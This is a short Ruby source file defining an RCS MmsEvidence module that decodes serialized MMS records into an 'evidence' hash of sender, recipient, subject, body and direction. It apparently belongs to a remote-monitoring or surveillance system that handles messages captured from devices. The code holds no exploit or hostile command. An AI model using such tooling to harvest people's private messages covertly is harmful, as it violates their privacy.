require_relative 'common'
require 'rcs-common/serializer'

module RCS
  module MmsEvidence
    def content
      raise "Not implemented!"
    end

    def generate_content
      raise "Not implemented!"
    end

    def decode_content(common_info, chunks)

      info =  Hash[common_info]
      info[:data] ||= Hash.new
      info[:data][:type] = :mms

      stream = StringIO.new chunks.join
      @mms = MAPISerializer.new.unserialize stream

      info[:data][:from] = @mms.fields[:from].delete("\x00")
      info[:data][:rcpt] = @mms.fields[:rcpt].delete("\x00")

      info[:data][:subject] = @mms.fields[:subject]
      info[:data][:content] = @mms.fields[:text_body]
      info[:data][:incoming] = @mms.flags

      yield info if block_given?
      :keep_raw
    end
  end # ::MmsEvidence
end # ::RCS
